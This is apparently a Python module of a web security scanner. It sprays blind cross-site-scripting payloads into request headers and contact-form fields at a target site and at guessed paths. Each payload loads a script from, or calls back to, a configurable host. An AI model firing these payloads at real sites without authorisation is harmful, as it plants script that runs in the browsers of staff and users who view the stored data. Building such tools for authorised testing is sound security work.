from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity
from urllib.parse import urljoin

BLIND_XSS_PAYLOADS = [
    '"><script src=http://{callback}:9999/{id}></script>',
    '\'><script src=http://{callback}:9999/{id}></script>',
    '</TITLE><script src=http://{callback}:9999/{id}></script>',
    '<img src=x onerror="new Image().src=\'http://{callback}:9999/{id}\'">',
    '<input onfocus="fetch(\'http://{callback}:9999/{id}\')" autofocus>',
]

HEADER_INJECTION_FIELDS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Originating-IP",
    "X-WAP-Profile",
]


@register_scanner(manifest=ScannerManifest(
    name="blind_xss_scanner",
    category="exploit",
    risk_level="moderate",
    estimated_cost=60,
    produces_tag_patterns=["blind-xss", "xss", "stored-xss"],
    produces_endpoint_types=[],
))
class BlindXssScanner(BaseScanner):
    name = "blind_xss_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        callback_host = self.config.ssrf_callback_host or "127.0.0.1"
        seed = abs(hash(self.session_id)) % 10_000
        inject_points = [target.url]

        if target.url.endswith("/"):
            inject_points.append(f"{target.url}api")
            inject_points.append(f"{target.url}contact")
            inject_points.append(f"{target.url}feedback")
            inject_points.append(f"{target.url}submit")

        for base_url in inject_points:
            for idx, payload_tpl in enumerate(BLIND_XSS_PAYLOADS):
                payload = payload_tpl.format(callback=callback_host, id=f"bxss{seed}_{idx}")
                for field in HEADER_INJECTION_FIELDS:
                    try:
                        resp = await client.request(
                            "POST", base_url,
                            data={"name": "test", "email": "a@b.com", "message": payload},
                            headers={field: payload, "Content-Type": "application/x-www-form-urlencoded"},
                            follow_redirects=True,
                        )
                        self._stats["requests"] += 1
                    except Exception:
                        self._stats["errors"] += 1

                    try:
                        resp = await client.request(
                            "GET", base_url,
                            headers={field: payload},
                            follow_redirects=True,
                        )
                        self._stats["requests"] += 1
                    except Exception:
                        self._stats["errors"] += 1

        return findings, endpoints
